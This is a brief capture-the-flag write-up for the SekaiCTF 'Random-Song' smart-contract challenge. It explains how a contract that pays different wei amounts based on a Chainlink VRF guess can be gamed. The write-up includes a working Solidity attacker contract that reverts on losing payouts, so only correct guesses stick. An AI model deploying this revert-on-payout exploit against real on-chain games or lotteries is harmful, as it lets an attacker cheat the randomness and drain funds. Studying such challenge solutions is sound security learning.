# SekaiCTF Random-Song
Got the first blood BTW 😎😎😎

# Problems
We need to guess correctly the Chainlink VRF/Random Number that will be modulo'd by 3, given 3 attempts, we need to guess all 3 correctly.
The chances of guessing all 3 correctly without any trick is is 1/3^3 = 1/27. Which is kinda bruteforcable, but a bit tiring.

# Noticing the attack vectors
```ts
    function fulfillRandomWords(
        uint256, // requestId
        uint256[] memory randomWords
    ) internal override {
        uint256 songSeq = randomWords[0] % 3;

        bonusEnergy -= 10;

        // receive the bonus! 0v0
        if (touchSeq != songSeq) {
            payable(player).transfer(5 wei);
            return;
        }
        payable(player).transfer(10 wei);
        allPerfect += 1;
    }
```
Hmmm... Why would the contract send different amount of eth depending on the result of the guess? Could we use this to our advantage?

# Building the Attack contract
We could just revert the transaction if we receive 5 wei(When our guess didn't match the random number). So we didn't consume any bonusEnergy and wasting our attempts.
```ts
contract ctf{
    randomSong target = randomSong(0x999501110b68F7d3f3e81de719DD239A97f9647C);
    receive() external payable {
        require(msg.value==10);
    }
    function fill() public{
        target.fillEnergy();
    }
    function play(uint num) public{
        target.play(num);
    }
}
```

# Capturing the flag
1. Initialize the contract by sending LINK and calling `fill()`
2. Deploy the attacker contract
3. call the `play()` function on the attacker contract with any number till you got 3 answers correct

